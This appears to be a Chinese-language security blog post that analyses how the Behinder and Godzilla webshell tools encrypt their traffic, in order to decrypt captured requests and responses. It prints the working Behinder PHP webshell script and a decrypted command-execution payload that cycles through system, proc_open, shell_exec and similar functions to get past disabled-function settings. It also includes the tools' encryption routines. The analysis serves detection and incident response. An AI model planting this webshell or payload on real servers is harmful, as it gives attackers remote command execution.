## **一、引言**

某行动在即，本文基于冰蝎Behinder_v3.0.11和哥斯拉v4.00-godzilla，对它们的加解密方式进行识别和分析【附简易解密脚本】，希望能在行动中助大家一臂之力。

##  **二、冰蝎**

冰蝎加密机制，通过阅读代码可知分为四类，即jsp，php，aspx，asp。

![](https://image.3001.net/images/20220719/1658227917_62d68ccd44e61d9a65d84.png!small)
**2.1 PHP**

阅读php木马脚本：

    
    
    <?php
    @error_reporting(0);
    session_start();
        $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
      $_SESSION['k']=$key;
      session_write_close();
      $post=file_get_contents("php://input");
      if(!extension_loaded('openssl'))
      {
        $t="base64_"."decode";
        $post=$t($post."");
        
        for($i=0;$i<strlen($post);$i++) {
               $post[$i] = $post[$i]^$key[$i+1&15]; 
              }
                echo "no openssl";
      }
      else
      {
        $post=openssl_decrypt($post, "AES128", $key);
      }
      // echo $post;
      // echo "------------------";
        $arr=explode('|',$post);
        // echo $arr[1];
        // echo "------------------";
        $func=$arr[0];
        $params=$arr[1];
      class C{public function __invoke($p) {eval($p."");}}
        @call_user_func(new C(),$params);
    ?>

阅读代码可知，在有openssl的情况下冰蝎会使用openssl进行aes128解密，在没有的情况下使用异或解密。

以一次cmd执行为例进行分析为例：

![](https://image.3001.net/images/20220719/1658228032_62d68d40ac0a92599f943.png!small)抓取请求进行AES128解密,得到如下代码，与冰蝎源码中的php
payload互相对应：

    
    
    @error_reporting(0);
    
    function getSafeStr($str){
        $s1 = iconv('utf-8','gbk//IGNORE',$str);
        $s0 = iconv('gbk','utf-8//IGNORE',$s1);
        if($s0 == $str){
            return $s0;
        }else{
            return iconv('gbk','utf-8//IGNORE',$str);
        }
    }
    function main($cmd,$path)
    {
        @set_time_limit(0);
        @ignore_user_abort(1);
        @ini_set('max_execution_time', 0);
        $result = array();
        $PadtJn = @ini_get('disable_functions');
        if (! empty($PadtJn)) {
            $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
            $PadtJn = explode(',', $PadtJn);
            $PadtJn = array_map('trim', $PadtJn);
        } else {
            $PadtJn = array();
        }
        $c = $cmd;
        if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
            $c = $c . " 2>&1\n";
        }
        $JueQDBH = 'is_callable';
        $Bvce = 'in_array';
        if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) {
            ob_start();
            system($c);
            $kWJW = ob_get_contents();
            ob_end_clean();
        } else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) {
            $handle = proc_open($c, array(
                array(
                    'pipe',
                    'r'
                ),
                array(
                    'pipe',
                    'w'
                ),
                array(
                    'pipe',
                    'w'
                )
            ), $pipes);
            $kWJW = NULL;
            while (! feof($pipes[1])) {
                $kWJW .= fread($pipes[1], 1024);
            }
            @proc_close($handle);
        } else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) {
            ob_start();
            passthru($c);
            $kWJW = ob_get_contents();
            ob_end_clean();
        } else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) {
            $kWJW = shell_exec($c);
        } else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) {
            $kWJW = array();
            exec($c, $kWJW);
            $kWJW = join(chr(10), $kWJW) . chr(10);
        } else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) {
            $fp = popen($c, 'r');
            $kWJW = NULL;
            if (is_resource($fp)) {
                while (! feof($fp)) {
                    $kWJW .= fread($fp, 1024);
                }
            }
            @pclose($fp);
        } else {
            $kWJW = 0;
            $result["status"] = base64_encode("fail");
            $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");
            $key = $_SESSION['k'];
            echo encrypt(json_encode($result), $key);
            return;
            
        }
        $result["status"] = base64_encode("success");
        $result["msg"] = base64_encode(getSafeStr($kWJW));
        echo encrypt(json_encode($result),  $_SESSION['k']);
    }
    
    function encrypt($data,$key)
    {
      if(!extension_loaded('openssl'))
          {
            for($i=0;$i<strlen($data);$i++) {
               $data[$i] = $data[$i]^$key[$i+1&15]; 
              }
          return $data;
          }
        else
          {
            return openssl_encrypt($data, "AES128", $key);
          }
    }$cmd="Y2QgL2QgIkU6XHBocHN0dWR5X3Byb1xXV1dcIiZkaXI=";$cmd=base64_decode($cmd);$path="RTovcGhwc3R1ZHlfcHJvL1dXVy8=";$path=base64_decode($path);
    main($cmd,$path);

其中cmd参数即为所传输命令的base64编码，并且可以得出响应体的加密与请求所用方式一致。对响应体解密，可以得到如下信息：

![](https://image.3001.net/images/20220719/1658228082_62d68d72eb5b77deb60e6.png!small)

其中，status与msg均为base64编码，解开即可得到明文。其他操作类型同理，均可解密为明文。

 **2.2 ASP**

由冰蝎代码可知asp使用xor加密

    
    
    public static byte[] EncryptForAsp(byte[] bs, String key) throws Exception { 
            for(int i = 0; i < bs.length; ++i) { 
                bs[i] ^= key.getBytes()[i + 1 & 15]; 
            } 
     
            return bs; 
        }

结合asp脚本，分析的出asp请求和响应使用xor加密可以解析；响应格式与php相同，status与msg均为base64编码，解开即可得到明文。![](https://image.3001.net/images/20220719/1658228147_62d68db30b83d68f91621.png!small)

 **2.3 CSharp**

通过阅读源码可知，aspx使用的AES/CBC/PKCS5Padding，iv为key。

    
    
    public static byte[] EncryptForCSharp(byte[] bs, String key) throws Exception { 
            byte[] raw = key.getBytes("utf-8"); 
            IvParameterSpec iv = new IvParameterSpec(raw); 
            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES"); 
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); 
            cipher.init(1, skeySpec, iv); 
            byte[] encrypted = cipher.doFinal(bs); 
            return encrypted; 
        }

由于aspx的payload为dll文件，请求解密后为pe文件格式，可将文件转存后用ida进行分析。响应解密出来同样是一个json：![](https://image.3001.net/images/20220719/1658228196_62d68de45d3e9396a021a.png!small)对应信息也需要base64解码为明文。

 **2.4 java**

冰蝎对jsp，jspx系列的处理是一致的。阅读源码可知，使用的是AES/ECB/PKCS5Padding.

    
    
    public static byte[] DecryptForJava(byte[] bs, String key) throws Exception { 
            byte[] raw = key.getBytes("utf-8"); 
            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES"); 
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding"); 
            cipher.init(2, skeySpec); 
            byte[] decrypted = cipher.doFinal(bs); 
            return decrypted; 
        }

由于传输的文件为java的class文件，请求解密后为class文件格式，可将文件转存后用idea进行分析。响应解密出来同样是json，对应信息也需要base64节码为明文。![](https://image.3001.net/images/20220719/1658228252_62d68e1c6821bec4c1d2a.png!small)

##  **三、哥斯拉**

相比于冰蝎，哥斯拉可选的加密方式就有很多种了，每一种都对应着一个server脚本。

![](https://image.3001.net/images/20220719/1658228327_62d68e67e6f76f02ac38e.png!small)且除了xor的加密方式，响应都会经过findstr函数，首尾各去掉的16位

![](https://image.3001.net/images/20220719/1658228349_62d68e7d8c5a5a9619aee.png!small)![](https://image.3001.net/images/20220719/1658228357_62d68e857fc19731e3b32.png!small)
**3.1 phpXor**

 **3.1.1 PhpEvalXor**

分析代码及流量，请求为明文可执行代码+加密数据，响应为去掉首尾后，先解base64然后解xor。关键代码如下:

    
    
    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(this.findStr(data));
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        } else {
            return data;
        }
    }
    public byte[] D(String data) {
        byte[] cs = functions.base64Decode(data);
        int len = cs.length;
    
        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }
    
        return cs;
    }

 **3.1.2 PhpXor**

分析代码及流量，请求位xor+base64，响应为去掉首尾后，xor+base64

关键代码如下:

    
    
    public byte[] encode(byte[] data) {
        try {
            return this.E(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }
    
    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(this.findStr(data));
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        } else {
            return data;
        }
    }
    
    public byte[] E(byte[] cs) {
        int len = cs.length;
    
        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }
    
        return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
    }
    
    public byte[] D(String data) {
        byte[] cs = functions.base64Decode(data);
        int len = cs.length;
    
        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }
    
        return cs;
    }

 **3.1.3 PhpXorRaw**

分析代码及流量，请求为xor，响应为xor关键代码如下:

    
    
    public byte[] encode(byte[] data) {
        try {
            return this.E(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }
    
    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(data);
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        } else {
            return data;
        }
    }
    
    public byte[] E(byte[] cs) {
        int len = cs.length;
    
        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }
    
        return cs;
    }
    
    public byte[] D(byte[] cs) {
        int len = cs.length;
    
        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }
    
        return cs;
    }

 **3.2 JavaAes**

 **3.2.1 JavaAesBase64**

请求响应均为为aes+base64，key就是参数key，模式为ECB关键代码如下：

    
    
    this.encodeCipher = Cipher.getInstance("AES");
    this.decodeCipher = Cipher.getInstance("AES");
    this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
    this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
    
    public byte[] encode(byte[] data) {
        try {
            return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }
    
    public byte[] decode(byte[] data) {
        try {
            data = functions.base64Decode(this.findStr(data));
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

 **3.2.2 JavaAesRaw**

请求响应均为为aes，key就是参数key，模式为ECB关键代码如下:

    
    
    this.encodeCipher = Cipher.getInstance("AES");
    this.decodeCipher = Cipher.getInstance("AES");
    this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
    this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
    public byte[] encode(byte[] data) {
        try {
            return this.encodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }
    
    public byte[] decode(byte[] data) {
        try {
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

 **3.3 CShapAes**

 **3.3.1 CShapAesBase64**

请求响应均为为aes+base64，key就是参数key，iv也是参数key，模式为CBC关键代码如下：

    
    
    this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
    this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
    
    public byte[] encode(byte[] data) {
            try {
                return (this.pass + "=" + URLEncoder.encode(functions.base64Encode(this.encodeCipher.doFinal(data)))).getBytes();
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        }
    
    public byte[] decode(byte[] data) {
        try {
            data = functions.base64Decode(this.findStr(data));
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

 **3.3.2 CShapAesRaw**

请求响应均为为aes，key就是参数key，iv也是参数key，模式为CBC关键代码如下:

    
    
    this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
    this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
    
    public byte[] encode(byte[] data) {
        try {
            return this.encodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }
    
    public byte[] decode(byte[] data) {
        try {
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

 **3.3.3 CSharpEvalAesBase64**

请求为明文可执行代码+加密数据，请求响应为aes，key就是参数key，iv也是参数key，模式为CBC关键代码如下：

    
    
    this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
    this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
    
    
    public byte[] encode(byte[] data) {
        try {
            return (String.format("%s=%s&", this.pass, this.evalContent) + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64Encode(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }
    
    public byte[] decode(byte[] data) {
        try {
            data = functions.base64Decode(this.findStr(data));
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

 **3.3.4 CShapAsmxAesBase64**

asmx加密方式与CShapAesBase64一致，只是传参变成xml格式![](https://image.3001.net/images/20220719/1658228603_62d68f7b2a56713284412.png!small)

 **3.4 aspXor**

asp系列的有一个改变就是非raw的首位16位填充变为了6位![](https://image.3001.net/images/20220719/1658228625_62d68f9183e0a2b4ff481.png!small)

 **3.4.1 AspRaw**

抓包可以看到通信是明文的不需要解密![](https://image.3001.net/images/20220719/1658228653_62d68fad2313de587df5e.png!small)

    
    
    public byte[] encode(byte[] data) {
            try {
                return data;
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        }
    
        public byte[] decode(byte[] data) {
            if (data != null && data.length > 0) {
                try {
                    return data;
                } catch (Exception var3) {
                    Log.error(var3);
                    return null;
                }
            } else {
                return data;
            }
        }

 **3.4.2 AspBase64**

加密方式为base64，响应首尾填充6位![](https://image.3001.net/images/20220719/1658228709_62d68fe52b66528b69b5f.png!small)

    
    
    public byte[] E(byte[] cs) {
            return (this.pass + "=" + this.chopperRequest + "&" + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
        }
    
        public byte[] D(String data) {
            byte[] cs = functions.base64Decode(data);
            return cs;
        }

 **3.4.4 AspXorBae64**

加密方式为base64+xor

响应首尾填充6位

    
    
    public byte[] encode(byte[] data) {
            try {
                return this.E(data);
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        }
    
        public byte[] decode(byte[] data) {
            if (data != null && data.length > 0) {
                try {
                    return this.D(this.findStr(data));
                } catch (Exception var3) {
                    Log.error(var3);
                    return null;
                }
            } else {
                return data;
            }
        }
    
    
        protected void decryption(byte[] data, byte[] key) {
            int len = data.length;
            int keyLen = key.length;
            int index = false;
    
            for(int i = 1; i <= len; ++i) {
                int index = i - 1;
                data[index] ^= key[i % keyLen];
            }
    
        }
    
        public byte[] E(byte[] cs) {
            this.decryption(cs, this.key);
            return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
        }
    
        public byte[] D(String data) {
            byte[] cs = functions.base64Decode(data);
            this.decryption(cs, this.key);
            return cs;
        }

 **3.4.5 AspXorRaw**

加密方式为xor其中，super.decryption即为xor函数

    
    
    public byte[] encode(byte[] data) { 
            try { 
                super.decryption(data, this.key); 
                return data; 
            } catch (Exception var3) { 
                Log.error(var3); 
                return null; 
            } 
        } 
     
        public byte[] decode(byte[] data) { 
            if (data != null && data.length > 0) { 
                try { 
                    super.decryption(data, this.key); 
                    return data; 
                } catch (Exception var3) { 
                    Log.error(var3); 
                    return null; 
                } 
            } else { 
                return data; 
            } 
        }

##  **四、解密脚本**

 **公众号回复** **“** **webshell”** **获取解密脚本链接**  
使用方法：按照加密类型、key和pass，初始化类。然后输入字节流形式的请求/响应体，调用相应的加/解密函数即可。如下例子：

    
    
    ```python
    decrypter = PHP_XOR_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    data = decrypter.decrypt_req_payload(b'pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ==')
    print(data)
    data = decrypter.decrypt_res_payload(b'72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488')
    print(data)
    ```
    

